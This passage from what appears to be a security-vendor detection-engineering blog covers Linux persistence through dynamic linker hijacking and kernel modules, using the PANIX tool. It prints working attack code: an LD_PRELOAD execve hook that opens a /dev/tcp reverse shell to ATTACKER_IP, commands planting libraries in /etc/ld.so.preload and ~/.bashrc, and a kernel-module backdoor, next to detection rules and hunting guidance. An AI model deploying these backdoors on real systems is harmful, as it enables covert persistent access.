<p>Here, the dynamic linker will first search <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp/custom_libs</code> for the libraries required by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/ls</code>. If a library is found there, it will be loaded instead of the default version.</p>
<p>While both <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code> can hijack the execution flow, they operate differently:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> directly specifies libraries to be loaded first, providing precise control over which functions are overridden.</li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code> alters the library search path, potentially affecting multiple libraries and their dependencies.</li>
</ul>
<p>Environment variables can be set by regular users without requiring administrative access, making them a useful tool to hijack the execution flow without requiring root privileges. Setting environment variables is not persistent. To make the changes persistent across sessions, attackers can append these variables to the shell initialization files such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bashrc</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.zshrc</code>. For example:</p>
<pre><code>&gt; echo &#x27;export LD_PRELOAD=/tmp/malicious_library.so&#x27; &gt;&gt; ~/.bashrc
&gt; echo &#x27;export LD_LIBRARY_PATH=/tmp/custom_libs&#x27; &gt;&gt; ~/.bashrc</code></pre>
<p>On the next successful login, these variables will automatically be set, ensuring that the specified libraries are loaded whenever a dynamically linked executable is run. For more details, refer to the section on <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms#t1546004---event-triggered-execution-unix-shell-configuration-modification">shell profile modification</a> in our <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">previous blog</a>.</p>
<p>With root access, an attacker can edit the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code> file or add configuration fragments to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf.d/</code> to insert malicious library paths. By running <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ldconfig</code>, they can ensure these libraries are cached and prioritized in the library search order for all users and applications. For example:</p>
<pre><code># Create a malicious shared library
&gt; mkdir /lib/malicious
&gt; gcc -shared -o /lib/malicious/libhack.so -fPIC /tmp/hack.c
&gt; cp malicious_libc.so /lib/malicious/libc.so.6

# Add the malicious library path to /etc/ld.so.conf and reload
&gt; echo &quot;/lib/malicious&quot; &gt;&gt; /etc/ld.so.conf
&gt; ldconfig

# Verify with ldd
&gt; ldd /bin/ls

linux-vdso.so.1 (0x00007ffd2b1a5000)
libc.so.6 =&gt; /lib/malicious/libc.so.6 (0x00007f23ac7e5000) /lib64/ld-linux-x86-64.so.2 (0x00007f23ac6e0000)</code></pre>
<p>This output indicates that the malicious <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libc.so.6</code> is now being loaded, hijacking the execution flow of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/ls</code> and potentially any other application relying on <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libc.so.6</code>.</p>
<p>Similarly, an attacker can manipulate the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code> file to force the dynamic linker to load a malicious shared library into every dynamically linked executable on the system. Unlike modifying the library search paths in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code>, this technique directly injects a library into the execution flow, overriding or augmenting critical functions across all applications. For example:</p>
<pre><code># Create a malicious shared library
&gt; gcc -shared -o /lib/malicious/libhack.so -fPIC hack.c

# Add the malicious library to /etc/ld.so.preload
&gt; echo &quot;/lib/malicious/libhack.so&quot; &gt;&gt; /etc/ld.so.preload

# Verify with ldd
ldd /bin/ls

linux-vdso.so.1 (0x00007ffd2b1a5000)
libhack.so =&gt; /lib/malicious/libhack.so (0x00007f23ac7e5000)
/lib64/ld-linux-x86-64.so.2 (0x00007f236034a000)</code></pre>
<p>The output shows that <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">libhack.so</code> is loaded before any other libraries. Since <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code> affects all dynamically linked executables, the attack impacts every user and application.</p>
<p>Additionally, root access allows for more potential attack vectors, such as:</p>
<ul>
<li>Overwriting legitimate libraries in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib64/</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib64/</code> with malicious versions.</li>
<li>Replacing and or modifying the dynamic linker binary (e.g. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ld-linux-x86-64.so.2</code>) to introduce backdoors or alter the library resolution process.</li>
<li>Modifying system-wide configuration files such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/bash.bashrc</code> to globally set <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code>.</li>
</ul>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1574006---dynamic-linker-hijacking-ld_preload" class="absolute -top-32"></span>Persistence through T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD</h4>
<p>Let’s examine how <a href="https://github.com/Aegrah/PANIX">PANIX</a> leverages the dynamic linker hijacking technique within the <a href="https://github.com/Aegrah/PANIX/blob/main/modules/setup_ld_preload.sh">setup_ld_preload.sh</a> module. This method relies on the presence of various compilation tools on the host system. PANIX hijacks the execution flow of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">execve</code> function for a user-specified binary, executing a backgrounded reverse shell whenever the binary is called:</p>
<pre><code>// Function pointer for the original execve
int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

// Function to spawn a reverse shell in the background
void spawn_reverse_shell() {
	pid_t pid = fork();
	if (pid == 0) { // Child process
		setsid(); // Start a new session
		char command[256];
		sprintf(command, &quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1&#x27;&quot;, ATTACKER_IP, ATTACKER_PORT);
		execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-c&quot;, command, NULL);
		exit(0); // Exit child process if execl fails
	}
}

// Hooked execve function
int execve(const char *pathname, char *const argv[], char *const envp[]) {
	// Load the original execve function
	if (!original_execve) {
		original_execve = dlsym(RTLD_NEXT, &quot;execve&quot;);
		if (!original_execve) {
			exit(1);
		}
	}

	// Check if the executed binary matches the specified binary
	if (strstr(pathname, &quot;$binary&quot;) != NULL) {
		// Spawn reverse shell in the background
		spawn_reverse_shell();
	}

	// Call the original execve function
	return original_execve(pathname, argv, envp);
}</code></pre>
<p>To load the malicious shared object, PANIX backdoors the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code> by default.</p>
<pre><code>// Compile the shared object
gcc -shared -fPIC -o $preload_lib $preload_source -ldl
if [ $? -ne 0 ]; then
	echo &quot;Compilation failed. Exiting.&quot;
	exit 1
fi

// Add to /etc/ld.so.preload for persistence
if ! grep -q &quot;$preload_lib&quot; &quot;$preload_file&quot; 2&gt;/dev/null; then
	echo $preload_lib &gt;&gt; $preload_file
	echo &quot;[+] Backdoor added to /etc/ld.so.preload for persistence.&quot;
else
	echo &quot;[!] Backdoor already present in /etc/ld.so.preload.&quot;
fi</code></pre>
<p>Let’s run the module:</p>
<pre><code>&gt; sudo ./panix.sh --ld-preload --ip 192.168.1.1 --port 2016 --binary ls

LD_PRELOAD source code created: /tmp/preload/preload_backdoor.c 
LD_PRELOAD shared object compiled successfully: /lib/preload_backdoor.so 
[+] Backdoor added to /etc/ld.so.preload for persistence. 
[+] Execute the binary ls to trigger the reverse shell.</code></pre>
<p>When opening a session, we can see the malicious library injected into the execution flow:</p>
<pre><code>&gt; ldd $(which ls)                                                                      

linux-vdso.so.1 (0x00007ffe00fe8000) /lib/preload_backdoor.so (0x00007f610548e000)
libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f61052bb000)
libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f61052b6000)
/lib64/ld-linux-x86-64.so.2 (0x00007f61054a0000)</code></pre>
<p>Executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls</code> command will spawn a reverse connection, while executing any other command, such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">whoami</code> will not. Let’s analyze the logs in Discover:</p>
<p></p>
<p>We can see PANIX being executed, after which the temporary <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">preload_backdoor.c</code> source code is created in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/tmp</code> directory. Next, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gcc</code> is used to compile the source code into a shared object and is added to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code> file, which did not yet exist and is therefore created. After executing the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ls</code> binary, the backdoor is triggered, initializing a reverse connection on the specified IP and port.</p>
<p>To detect different activities along the chain, we have the following detection and endpoint rules in place:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_dynamic_linker_file_creation.toml#L18">Dynamic Linker Creation or Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/integrations/fim/persistence_suspicious_file_modifications.toml#L20">Potential Persistence via File Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_shared_object_creation.toml#L187">Shared Object Created or Changed by Previously Unknown Process</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_ld_preload_shared_object_modif.toml">Modification of Dynamic Linker Preload Shared Object</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/defense_evasion_hidden_shared_object.toml#L10">Creation of Hidden Shared Object File</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_ld_so_creation.toml">Dynamic Linker (ld.so) Creation</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/86cc61c233c385064c4f16c0c88d2d9521c5dbdb/rules/linux/persistence_dynamic_linker_backup.toml#L2">Dynamic Linker Copy</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/defense_evasion_shared_object_injection_via_process_environment_variable.toml">Shared Object Injection via Process Environment Variable</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/defense_evasion_unusual_preload_env_vars.toml">Unusual Preload Environment Variable Process Execution</a></td></tr><tr><td><em>Detection and endpoint rules that cover dynamic linker hijacking persistence</em></td><td></td></tr></tbody></table></div>
<p>To revert any changes made to the system by PANIX, you can use the corresponding revert module by running:</p>
<pre><code>&gt; sudo ./panix.sh --revert ld-preload 

[+] Reverting ld-preload module...
[+] Removing /lib/preload_backdoor.so from /etc/ld.so.preload...
[+] Removed entry from /etc/ld.so.preload.
[+] Removing malicious shared library /lib/preload_backdoor.so...
[+] Removed /lib/preload_backdoor.so.
[+] Removing temporary directory /tmp/preload...
[+] Removed /tmp/preload.
[!] Note: The backdoor may still be active in your current session.
[!] Please restart your shell session to fully disable the backdoor.
[!] Run &#x27;exec bash&#x27; to start a new shell session.                                                                       

&gt; exec bash</code></pre>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hunting-for-t1574006---dynamic-linker-hijacking-ld_preload" class="absolute -top-32"></span>Hunting for T1574.006 - Dynamic Linker Hijacking: LD_PRELOAD</h4>
<p>Other than relying on detections, it is important to incorporate threat hunting into your workflow. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the “<em>Hunting for T1053 - scheduled task/job</em>” section of “<em><a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">Linux Detection Engineering -  A primer on persistence mechanisms</a></em>”. Additionally, descriptions and references can be found in our <a href="https://github.com/elastic/detection-rules">Detection Rules repository</a>, specifically in the <a href="https://github.com/elastic/detection-rules/tree/main/hunting">Linux hunting subdirectory</a>.</p>
<p>We can hunt for this technique using <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html">ES|QL</a> and <a href="https://www.elastic.co/guide/en/kibana/current/osquery.html">OSQuery</a> by focusing on the misuse of dynamic linker environment variables like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code>. The approach includes monitoring for the following:</p>
<ul>
<li><strong>Processes with suspicious environment variables:</strong> Tracks processes with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_PRELOAD</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LD_LIBRARY_PATH</code> set to unusual values.</li>
<li><strong>Creation of shared object (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.so</code>) files:</strong> Observes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.so</code> files created in non-standard or uncommon directories, which could indicate malicious activity.</li>
<li><strong>Modifications to critical dynamic linker files:</strong> Monitors changes to files like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.preload</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf</code>, and associated directories such as <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/ld.so.conf.d/</code>.</li>
</ul>
<p>By combining the <a href="https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_dynamic_linker_hijacking.md">Persistence via Dynamic Linker Hijacking</a> hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to <a href="https://attack.mitre.org/techniques/T1574/006/">T1574.006</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1547006---boot-or-logon-autostart-execution-kernel-modules-and-extensions" class="absolute -top-32"></span>T1547.006 - Boot or Logon Autostart Execution: Kernel Modules and Extensions</h2>
<p><a href="https://man.openbsd.org/OpenBSD-5.1/lkm.4">Loadable Kernel Modules (LKMs)</a> provide a way to extend kernel functionality without modifying the core kernel itself. These modules can be dynamically loaded and unloaded at runtime, enabling features like hardware driver support, network protocol handling, and file system management.</p>
<p>Modules are typically stored in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/modules/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modules/</code> directory followed by a subdirectory for the active kernel version and are organized into subdirectories based on their functionality, such as drivers or network protocols. To ensure an LKM is loaded on boot, the following configuration files are read:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modules</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modprobe.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modprobe.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modules-load.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/modules-load.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/lib/modules-load.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modules-load.d/</code></li>
</ul>
<p>Management tools like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modprobe</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">insmod</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rmmod</code> are used to load, list, or unload modules.</p>
<p>When an LKM is loaded, the following sequence occurs:</p>
<ol>
<li>User-space invocation:<br/>
<!-- -->a. A user with sufficient privileges initiates the loading process using tools like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modprobe</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">insmod</code>.</li>
<li>Syscall invocation:<br/>
<!-- -->a. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init_module()</code>: Loads a module from memory.<br/>
<!-- -->b. <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">finit_module()</code>: Loads a module from a file descriptor.</li>
<li>Kernel validation:<br/>
<!-- -->a. The kernel verifies the module&#x27;s integrity, structure, and compatibility.<br/>
<!-- -->b. Checks include validation of the ELF format and kernel version compatibility using metadata like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vermagic</code>.</li>
<li>Dependency Resolution:<br/>
<!-- -->a. Tools like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">depmod</code> generate dependency files that <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modprobe</code> uses to load any required modules.</li>
<li>Initialization and integration:<br/>
<!-- -->a. The module&#x27;s initialization function is executed, integrating it with the kernel&#x27;s functionality through exported symbols and interfaces.</li>
</ol>
<p>Newer systems leverage <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code> to invoke module loading during startup based on unit dependencies specified in service files. Older systems may still use scripts in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.d/</code> to load modules at boot.</p>
<p>The kernel prioritizes modules based on their order in dependency files or init system configurations. The search and load process typically follows:</p>
<ol>
<li>Default paths specified in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/modules/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modules/</code></li>
<li>Overrides defined in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/modprobe.d/</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/modeprobe.d/</code></li>
<li>Kernel command-line parameters (e.g., <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">modprobe.blacklist</code>).</li>
</ol>
<p>The flexibility and power of LKMs make them a double-edged sword, as they are not only indispensable for system functionality but also a potential vector for sophisticated threats, such as rootkits. MITRE tracks this technique under <a href="https://attack.mitre.org/techniques/T1547/006/">T1547.006</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1014---rootkit" class="absolute -top-32"></span>T1014 - Rootkit</h3>
<p>Rootkits are a class of malicious software designed to conceal their presence and maintain persistent access to a system. They operate at various levels, from user-space applications to kernel-level modules. Kernel-level rootkits leverage LKMs, manipulating kernel behavior to hide processes, files, and network activity, making them difficult to detect.</p>
<p>While rootkits are a broad and advanced topic, they are closely related to T1547.006 - Kernel Modules and Extensions. By modifying kernel structures or intercepting system calls, these rootkits can gain deep control over the system while remaining hidden from standard detection methods. MITRE tracks Rootkits specifically under <a href="https://attack.mitre.org/techniques/T1014/">T1014</a>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="future-work-t1014---rootkit" class="absolute -top-32"></span>Future Work: T1014 - Rootkit</h4>
<p>Rootkits are a vast topic deserving dedicated attention. In upcoming publications, we will explore:</p>
<ul>
<li>The basics of rootkits.</li>
<li>Techniques for detecting and hunting rootkits.</li>
<li>Real-world examples of rootkit attacks and defenses.</li>
</ul>
<p>For now, understanding how LKMs are used as a vector for kernel rootkits bridges the gap between T1547.006 - Kernel Modules and Extensions and the broader topic of rootkits. This blog lays the groundwork for the in-depth exploration of rootkits to come.</p>
<p>Can’t wait to learn more about rootkits? Read our recent research, “<em><a href="https://www.elastic.co/security-labs/declawing-pumakit">Declawing PUMAKIT</a></em>”, a sophisticated LKM rootkit that employs mechanisms to hide its presence and maintain communication with its C2 servers.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1547006---kernel-modules-and-extensions" class="absolute -top-32"></span>Persistence through T1547.006 - Kernel Modules and Extensions</h4>
<p>While T1547.006 and T1014 share some overlap, PANIX includes two distinct modules: one for a basic LKM and another for a fully implemented rootkit. We’ll begin with the simple LKM using the <a href="https://github.com/Aegrah/PANIX/blob/main/modules/setup_lkm.sh">setup_lkm.sh</a> module for T1547. As before, this module requires kernel headers and compilation tools to be available on the host.</p>
<p>The LKM being created is a simple module that spawns a separate thread to execute a specified command. Once the command is executed, the thread enters a sleep state for 60 seconds before repeating the process in an infinite while loop.</p>
<pre><code>#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/init.h&gt;
#include &lt;linux/kthread.h&gt;
#include &lt;linux/delay.h&gt;
#include &lt;linux/signal.h&gt;

static struct task_struct *task;

static int backdoor_thread(void *arg) {
	allow_signal(SIGKILL);
	while (!kthread_should_stop()) {
		char *argv[] = {$command};
		call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
		ssleep(60);
	}
	return 0;
}

static int __init lkm_backdoor_init(void) {
	printk(KERN_INFO &quot;Loading LKM backdoor module\\n&quot;);
	task = kthread_run(backdoor_thread, NULL, &quot;lkm_backdoor_thread&quot;);
	return 0;
}

static void __exit lkm_backdoor_exit(void) {
	printk(KERN_INFO &quot;Removing LKM backdoor module\\n&quot;);
	if (task) {
		kthread_stop(task);
	}
}

module_init(lkm_backdoor_init);
module_exit(lkm_backdoor_exit);

MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;PANIX&quot;);
MODULE_DESCRIPTION(&quot;LKM Backdoor&quot;);</code></pre>
<p>After compilation with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">make</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">gcc</code>, it copies the LKM to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/modules/$(uname -r)/kernel/drivers/${lkm_name}.ko</code> and executes the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo insmod ${lkm_destination}</code> to load the module. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">$(uname -r)</code> command ensures that the path corresponding to the active kernel version is resolved.</p>
<p>Let’s run the module:</p>
<pre><code>&gt; sudo ./panix.sh --lkm --default --ip 192.168.1.1 --port 2017

[+] Kernel module source code created: /tmp/lkm/panix.c
[+] Makefile created: /tmp/lkm/Makefile 
[+] Kernel module compiled successfully: /lib/modules/4.19.0-27-amd64/kernel/drivers/panix.ko
[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/...
[+] Kernel module loaded successfully. Check dmesg for the output.
[+] Kernel module added to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
[+] LKM backdoor established!</code></pre>
<p>Taking a look at the remnants left behind in Discover, we can see:</p>
<p></p>
